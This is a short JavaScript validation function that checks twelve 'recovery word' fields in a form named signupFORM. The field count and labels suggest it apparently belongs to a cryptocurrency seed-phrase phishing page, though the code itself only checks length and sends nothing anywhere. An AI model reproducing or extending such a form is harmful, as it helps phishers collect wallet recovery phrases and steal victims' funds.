
function PLX() {
var signupFORM = document.frm;

if (signupFORM.WoRd1.value.length <3) {
alert("Notification: Enter a valid recovery word.");
signupFORM.WoRd1.focus();
return false;



}
if (signupFORM.WoRd2.value.length <3) {
alert("Notification: Enter a valid recovery word.");
signupFORM.WoRd2.focus();
return false;



}
if (signupFORM.WoRd3.value.length <3) {
alert("Notification: Enter a valid recovery word.");
signupFORM.WoRd3.focus();
return false;



}
if (signupFORM.WoRd4.value.length <3) {
alert("Notification: Enter a valid recovery word.");
signupFORM.WoRd4.focus();
return false;



}
if (signupFORM.WoRd5.value.length <3) {
alert("Notification: Enter a valid recovery word.");
signupFORM.WoRd5.focus();
return false;



}
if (signupFORM.WoRd6.value.length <3) {
alert("Notification: Enter a valid recovery word.");
signupFORM.WoRd6.focus();
return false;



}
if (signupFORM.WoRd7.value.length <3) {
alert("Notification: Enter a valid recovery word.");
signupFORM.WoRd7.focus();
return false;



}
if (signupFORM.WoRd8.value.length <3) {
alert("Notification: Enter a valid recovery word.");
signupFORM.WoRd8.focus();
return false;



}
if (signupFORM.WoRd9.value.length <3) {
alert("Notification: Enter a valid recovery word.");
signupFORM.WoRd9.focus();
return false;



}
if (signupFORM.WoRd10.value.length <3) {
alert("Notification: Enter a valid recovery word.");
signupFORM.WoRd10.focus();
return false;



}
if (signupFORM.WoRd11.value.length <3) {
alert("Notification: Enter a valid recovery word.");
signupFORM.WoRd11.focus();
return false;



}
if (signupFORM.WoRd12.value.length <3) {
alert("Notification: Enter a valid recovery word.");
signupFORM.WoRd12.focus();
return false;



}
}